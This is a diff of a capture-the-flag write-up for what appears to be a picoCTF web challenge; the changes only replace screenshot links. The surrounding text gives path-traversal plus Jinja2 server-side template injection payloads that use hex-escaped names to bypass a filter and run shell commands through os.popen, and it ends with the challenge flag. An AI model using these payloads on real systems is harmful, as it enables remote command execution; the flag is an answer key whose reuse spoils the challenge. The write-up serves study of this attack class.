@@ -147,7 +147,8 @@ Then i use the testing query cheking which template is it : `{{7*7}}`
 
 Full payload: `..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{7*7}}`
 
-![image](https://hackmd.io/_uploads/BJWYBu1oGl.png)
+<img width="848" height="373" alt="Screenshot 2026-10-04 134303" src="https://github.com/user-attachments/assets/c26bafe3-5b38-49d3-9f8e-be464200f8d1" />
+
 
 Then now do the search the error file through `error` parameter
 
@@ -173,13 +174,15 @@ Now let combine the payload and the SSTI payload that can bypass filter block `/
 
 Full payload:`..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls')['read']()}}`
 
-![image](https://hackmd.io/_uploads/SyCiUd1ofx.png)
+<img width="850" height="330" alt="Screenshot 2026-10-04 134803" src="https://github.com/user-attachments/assets/0ee46ad5-347a-4d92-a88f-9ca7d24264e7" />
+
 
 
 Now read the flag and end this challenge:
 
 Final payload:`..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt')['read']()}}`
-![image](https://hackmd.io/_uploads/rkyEPd1izl.png)
+<img width="811" height="346" alt="Screenshot 2026-10-04 135012" src="https://github.com/user-attachments/assets/66432eb8-b812-4b6c-b47c-81c4a794424a" />
+
 
 
 **FLAG**: `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`
